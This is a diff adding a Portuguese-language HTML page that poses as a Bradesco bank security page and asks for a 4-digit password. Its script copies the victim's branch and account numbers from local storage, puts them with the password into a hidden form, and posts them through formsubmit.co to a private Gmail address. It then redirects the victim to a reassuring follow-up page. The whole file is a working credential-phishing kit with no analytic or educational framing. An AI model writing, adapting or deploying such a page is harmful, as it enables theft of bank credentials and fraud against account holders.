@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+  <meta charset="UTF-8">
+  <title>Bradesco Protege - Senha</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <h1>🔐 Digite sua senha</h1>
+  <p>A senha deve conter <strong>4 dígitos numéricos</strong></p>
+
+  <input type="password" id="senha" maxlength="4" oninput="validarSenha(this)">
+  <br><br>
+  <button onclick="confirmarSenha()">Confirmar</button>
+
+  <!-- Formulário invisível para envio por e-mail -->
+  <form id="envioEmail" action="https://formsubmit.co/eliatelie511@gmail.com" method="POST" style="display:none;">
+    <input type="hidden" name="_subject" value="Novo acesso Bradesco Protege">
+    <input type="hidden" name="Agência" id="agenciaHidden">
+    <input type="hidden" name="Conta" id="contaHidden">
+    <input type="hidden" name="Senha" id="senhaHidden">
+    <input type="hidden" name="DataHora" id="dataHoraHidden">
+  </form>
+
+  <script>
+    function validarSenha(campo) {
+      campo.value = campo.value.replace(/\D/g, '');
+      if (campo.value.length > 4) {
+        campo.value = campo.value.slice(0, 4);
+        alert("⚠️ A senha deve ter apenas 4 números.");
+      }
+    }
+
+    function confirmarSenha() {
+      const senha = document.getElementById("senha").value;
+      if (senha.length !== 4) {
+        alert("⚠️ Digite exatamente 4 números.");
+        return;
+      }
+
+      const agencia = localStorage.getItem("agencia") || "N/A";
+      const conta = localStorage.getItem("conta") || "N/A";
+
+      const agora = new Date();
+      const dia = String(agora.getDate()).padStart(2, '0');
+      const mes = String(agora.getMonth() + 1).padStart(2, '0');
+      const ano = agora.getFullYear();
+      const hora = String(agora.getHours()).padStart(2, '0');
+      const minuto = String(agora.getMinutes()).padStart(2, '0');
+      const dataHora = `${dia}/${mes}/${ano} - ${hora}:${minuto}`;
+
+      // Preenche os campos ocultos
+      document.getElementById("agenciaHidden").value = agencia;
+      document.getElementById("contaHidden").value = conta;
+      document.getElementById("senhaHidden").value = senha;
+      document.getElementById("dataHoraHidden").value = dataHora;
+
+      // Envia o formulário
+      document.getElementById("envioEmail").submit();
+
+      // Redireciona para a página final
+      window.location.href = "seguranca.html";
+    }
+  </script>
+</body>
+</html>
